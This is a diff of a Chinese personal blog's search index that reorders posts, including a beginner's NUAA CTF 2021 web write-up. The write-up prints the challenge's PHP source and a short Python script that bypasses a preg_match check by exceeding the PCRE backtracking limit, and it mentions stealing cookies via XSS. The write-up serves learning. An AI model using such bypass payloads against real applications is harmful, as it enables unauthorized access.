@@ -1,6 +1,11 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>0x 00</title>
+    <url>/2021/04/02/0x00/</url>
+    <content><![CDATA[<h1 id="JUST-A-TEST"><a href="#JUST-A-TEST" class="headerlink" title="JUST A TEST!"></a>JUST A TEST!</h1>]]></content>
+  </entry>
+  <entry>
     <title>CTF学习笔记</title>
     <url>/2021/05/27/CTF%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
     <content><![CDATA[<p>萌新的入坑记录而已</p>
@@ -15,36 +20,6 @@
       </categories>
       <tags>
         <tag>CTF</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>0x 00</title>
-    <url>/2021/04/02/0x00/</url>
-    <content><![CDATA[<h1 id="JUST-A-TEST"><a href="#JUST-A-TEST" class="headerlink" title="JUST A TEST!"></a>JUST A TEST!</h1>]]></content>
-  </entry>
-  <entry>
-    <title>Git学习记录</title>
-    <url>/2021/04/17/Git%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</url>
-    <content><![CDATA[<h1 id="Git学习记录"><a href="#Git学习记录" class="headerlink" title="Git学习记录"></a>Git学习记录</h1><p>萌新在线嘤嘤嘤</p>
-<span id="more"></span>
-<h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><ol>
-<li><code>git clone URL</code><blockquote>
-<p>从该URL下载文件</p>
-</blockquote>
-<ul>
-<li><code>git clone --depth 1 URL</code><blockquote>
-<p>从该URL下载最新版本文件</p>
-</blockquote>
-</li>
-</ul>
-</li>
-</ol>
-]]></content>
-      <categories>
-        <category>开发</category>
-      </categories>
-      <tags>
-        <tag>Git</tag>
       </tags>
   </entry>
   <entry>
@@ -90,6 +65,31 @@
       </tags>
   </entry>
   <entry>
+    <title>Git学习记录</title>
+    <url>/2021/04/17/Git%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</url>
+    <content><![CDATA[<h1 id="Git学习记录"><a href="#Git学习记录" class="headerlink" title="Git学习记录"></a>Git学习记录</h1><p>萌新在线嘤嘤嘤</p>
+<span id="more"></span>
+<h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><ol>
+<li><code>git clone URL</code><blockquote>
+<p>从该URL下载文件</p>
+</blockquote>
+<ul>
+<li><code>git clone --depth 1 URL</code><blockquote>
+<p>从该URL下载最新版本文件</p>
+</blockquote>
+</li>
+</ul>
+</li>
+</ol>
+]]></content>
+      <categories>
+        <category>开发</category>
+      </categories>
+      <tags>
+        <tag>Git</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>HTTP学习记录</title>
     <url>/2021/07/12/HTTP%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</url>
     <content><![CDATA[<p>《图解HTTP》学习记录</p>
@@ -103,7 +103,7 @@
 <p><a href="ftp://ftp.is.co.za/rfc/rfc1808.txt">ftp://ftp.is.co.za/rfc/rfc1808.txt</a>   </p>
 <p><a href="http://www.ietf.org/rfc/rfc2396.txt">http://www.ietf.org/rfc/rfc2396.txt</a>    </p>
 <p>ldap://[2001:db8::7]/c=GB?objectClass?one    </p>
-<p>mailto:<a href="mailto:&#74;&#111;&#x68;&#110;&#46;&#68;&#111;&#101;&#64;&#x65;&#x78;&#97;&#109;&#x70;&#108;&#101;&#x2e;&#99;&#x6f;&#109;">&#74;&#111;&#x68;&#110;&#46;&#68;&#111;&#101;&#64;&#x65;&#x78;&#97;&#109;&#x70;&#108;&#101;&#x2e;&#99;&#x6f;&#109;</a>    </p>
+<p>mailto:<a href="mailto:&#74;&#111;&#x68;&#x6e;&#x2e;&#68;&#x6f;&#x65;&#x40;&#101;&#x78;&#97;&#109;&#x70;&#x6c;&#x65;&#46;&#x63;&#x6f;&#109;">&#74;&#111;&#x68;&#x6e;&#x2e;&#68;&#x6f;&#x65;&#x40;&#101;&#x78;&#97;&#109;&#x70;&#x6c;&#x65;&#46;&#x63;&#x6f;&#109;</a>    </p>
 <p>news:comp.infosystems.<a href="http://www.servers.unix/">www.servers.unix</a>    </p>
 <p>tel:+1-816-555-1212    </p>
 <p>telnet://192.0.2.16:80/    </p>
@@ -128,38 +128,6 @@
       </categories>
       <tags>
         <tag>CTF 渗透测试</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>NUAA CTF 2021 Web Write up</title>
-    <url>/2021/04/10/NUAA%20CTF%202021%20WP/</url>
-    <content><![CDATA[<h1 id="NUAA-CTF-2021-Web-Write-up"><a href="#NUAA-CTF-2021-Web-Write-up" class="headerlink" title="NUAA CTF 2021 Web Write up"></a>NUAA CTF 2021 Web Write up</h1><p>第一场正式的的CTF比赛WP</p>
-<span id="more"></span>
-
-<h2 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h2><p>打开环境，查看网页源代码，即发现flag<br><img src="https://img-blog.csdnimg.cn/20210328195900666.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_SGFpcnNoZWVw,size_20,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<h2 id="DDoSme"><a href="#DDoSme" class="headerlink" title="DDoSme"></a>DDoSme</h2><p>打开环境，提示Do you kNow .swp file? 直接百度，查到<br><img src="https://img-blog.csdnimg.cn/20210328204502583.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_SGFpcnNoZWVw,size_64,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>于是知道会要用到Linux<br>用dirsearch扫一下网站目录，发现了.index.php.swp文件</p>
-<p><img src="https://img-blog.csdnimg.cn/20210328204551203.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_SGFpcnNoZWVw,size_64,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>地址栏URL后面输入<code>.index.php.swp</code>下载swp文件<br>这个时候用notepad打开发现全是乱码，百度发现<br><img src="https://img-blog.csdnimg.cn/20210328200950634.png"></p>
-<p>于是复制到Linux虚拟机中，</p>
-<p><img src="https://img-blog.csdnimg.cn/20210328204652570.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_SGFpcnNoZWVw,size_64,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>再<br><img src="https://img-blog.csdnimg.cn/20210328201104698.png" alt="在这里插入图片描述"></p>
-<p>得到还原后的PHP文件</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">areyouok</span>(<span class="params"><span class="variable">$greeting</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_match(<span class="string">&#x27;/Baby.*PHP/is&#x27;</span>,<span class="variable">$greeting</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$greeting</span>=@<span class="variable">$_POST</span>[<span class="string">&#x27;greeting&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!is_array(<span class="variable">$greeting</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!areyouok(<span class="variable">$greeting</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(strpos(<span class="variable">$greeting</span>,<span class="string">&#x27;Baby PHP&#x27;</span>)!==<span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;flag&#123;xxxxxx&#125;&#x27;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;Do you kNow .swp file?&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Do you know PHP?&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>emmm…PHP学的还不多，看不懂，果断度娘，发现……竟然跟18年i春秋圣诞欢乐赛题一样…原理就是pcre具有回溯上限，当回溯超过上限时返回 false，从而绕过正则匹配函数(虽然俺不懂，但俺会CV大法)<br>链接:<a href="https://www.jianshu.com/p/68f3c8e5d2b4">2018年i春秋圣诞欢乐赛Web WP</a><br>然后通过Python写个脚本：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"></span><br><span class="line">files = &#123;</span><br><span class="line">  <span class="string">&#x27;greeting&#x27;</span>:(<span class="string">&#x27;Baby PHP&#x27;</span> + <span class="string">&#x27;a&#x27;</span> * <span class="number">1000000</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">res = requests.post(<span class="string">&#x27;http://server.cooook.icu:10003/index.php&#x27;</span>, data=files, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure>
-<p>运行之后，成功拿到flag</p>
-<p><img src="https://img-blog.csdnimg.cn/20210328204722851.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_SGFpcnNoZWVw,size_32,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<h2 id="easy-xss"><a href="#easy-xss" class="headerlink" title="easy_xss"></a>easy_xss</h2><p>看题目知道是xss跨站脚本漏洞攻击<br>题目要求是：<br><img src="https://img-blog.csdnimg.cn/20210328201752270.png" alt="在这里插入图片描述"><br>扫了下网站<br><img src="https://img-blog.csdnimg.cn/20210328201935905.png" alt="在这里插入图片描述"><br>看到了upload.php，试了一下emmm确实打不开<br>所以要登入管理员界面，xss攻击，想到了窃取cookie绕过登录，<br>而且正好点开Read sample post出现了管理员发表的文章</p>
-<p>然后..就卡住了(っ °Д °)っ<br><img src="https://img-blog.csdnimg.cn/20210328204809754.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_SGFpcnNoZWVw,size_64,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<h2 id="base64"><a href="#base64" class="headerlink" title="base64"></a>base64</h2><p><img src="https://img-blog.csdnimg.cn/2021032821021262.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_SGFpcnNoZWVw,size_32,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210328210244539.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_SGFpcnNoZWVw,size_48,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>emmm……PHP，Base64，这俩合一起….看了度娘都看不懂…毫无思路</p>
-<p>比完赛，感觉 我是废物（；´д｀）ゞ</p>
-]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>CTF</tag>
       </tags>
   </entry>
   <entry>
@@ -228,6 +196,38 @@
 
 <p>最后在一个状态码为200的响应返回包中发现flag</p>
 <h4 id="响应包源代码"><a href="#响应包源代码" class="headerlink" title="响应包源代码"></a>响应包源代码</h4><p>饿饿. 打开环境查看源码 发现flag…我人傻了</p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>NUAA CTF 2021 Web Write up</title>
+    <url>/2021/04/10/NUAA%20CTF%202021%20WP/</url>
+    <content><![CDATA[<h1 id="NUAA-CTF-2021-Web-Write-up"><a href="#NUAA-CTF-2021-Web-Write-up" class="headerlink" title="NUAA CTF 2021 Web Write up"></a>NUAA CTF 2021 Web Write up</h1><p>第一场正式的的CTF比赛WP</p>
+<span id="more"></span>
+
+<h2 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h2><p>打开环境，查看网页源代码，即发现flag<br><img src="https://img-blog.csdnimg.cn/20210328195900666.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_SGFpcnNoZWVw,size_20,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h2 id="DDoSme"><a href="#DDoSme" class="headerlink" title="DDoSme"></a>DDoSme</h2><p>打开环境，提示Do you kNow .swp file? 直接百度，查到<br><img src="https://img-blog.csdnimg.cn/20210328204502583.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_SGFpcnNoZWVw,size_64,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>于是知道会要用到Linux<br>用dirsearch扫一下网站目录，发现了.index.php.swp文件</p>
+<p><img src="https://img-blog.csdnimg.cn/20210328204551203.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_SGFpcnNoZWVw,size_64,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>地址栏URL后面输入<code>.index.php.swp</code>下载swp文件<br>这个时候用notepad打开发现全是乱码，百度发现<br><img src="https://img-blog.csdnimg.cn/20210328200950634.png"></p>
+<p>于是复制到Linux虚拟机中，</p>
+<p><img src="https://img-blog.csdnimg.cn/20210328204652570.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_SGFpcnNoZWVw,size_64,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>再<br><img src="https://img-blog.csdnimg.cn/20210328201104698.png" alt="在这里插入图片描述"></p>
+<p>得到还原后的PHP文件</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">areyouok</span>(<span class="params"><span class="variable">$greeting</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_match(<span class="string">&#x27;/Baby.*PHP/is&#x27;</span>,<span class="variable">$greeting</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$greeting</span>=@<span class="variable">$_POST</span>[<span class="string">&#x27;greeting&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!is_array(<span class="variable">$greeting</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!areyouok(<span class="variable">$greeting</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(strpos(<span class="variable">$greeting</span>,<span class="string">&#x27;Baby PHP&#x27;</span>)!==<span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;flag&#123;xxxxxx&#125;&#x27;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;Do you kNow .swp file?&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Do you know PHP?&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>emmm…PHP学的还不多，看不懂，果断度娘，发现……竟然跟18年i春秋圣诞欢乐赛题一样…原理就是pcre具有回溯上限，当回溯超过上限时返回 false，从而绕过正则匹配函数(虽然俺不懂，但俺会CV大法)<br>链接:<a href="https://www.jianshu.com/p/68f3c8e5d2b4">2018年i春秋圣诞欢乐赛Web WP</a><br>然后通过Python写个脚本：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"></span><br><span class="line">files = &#123;</span><br><span class="line">  <span class="string">&#x27;greeting&#x27;</span>:(<span class="string">&#x27;Baby PHP&#x27;</span> + <span class="string">&#x27;a&#x27;</span> * <span class="number">1000000</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">res = requests.post(<span class="string">&#x27;http://server.cooook.icu:10003/index.php&#x27;</span>, data=files, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure>
+<p>运行之后，成功拿到flag</p>
+<p><img src="https://img-blog.csdnimg.cn/20210328204722851.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_SGFpcnNoZWVw,size_32,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h2 id="easy-xss"><a href="#easy-xss" class="headerlink" title="easy_xss"></a>easy_xss</h2><p>看题目知道是xss跨站脚本漏洞攻击<br>题目要求是：<br><img src="https://img-blog.csdnimg.cn/20210328201752270.png" alt="在这里插入图片描述"><br>扫了下网站<br><img src="https://img-blog.csdnimg.cn/20210328201935905.png" alt="在这里插入图片描述"><br>看到了upload.php，试了一下emmm确实打不开<br>所以要登入管理员界面，xss攻击，想到了窃取cookie绕过登录，<br>而且正好点开Read sample post出现了管理员发表的文章</p>
+<p>然后..就卡住了(っ °Д °)っ<br><img src="https://img-blog.csdnimg.cn/20210328204809754.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_SGFpcnNoZWVw,size_64,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h2 id="base64"><a href="#base64" class="headerlink" title="base64"></a>base64</h2><p><img src="https://img-blog.csdnimg.cn/2021032821021262.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_SGFpcnNoZWVw,size_32,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210328210244539.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_SGFpcnNoZWVw,size_48,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>emmm……PHP，Base64，这俩合一起….看了度娘都看不懂…毫无思路</p>
+<p>比完赛，感觉 我是废物（；´д｀）ゞ</p>
 ]]></content>
       <categories>
         <category>CTF</category>
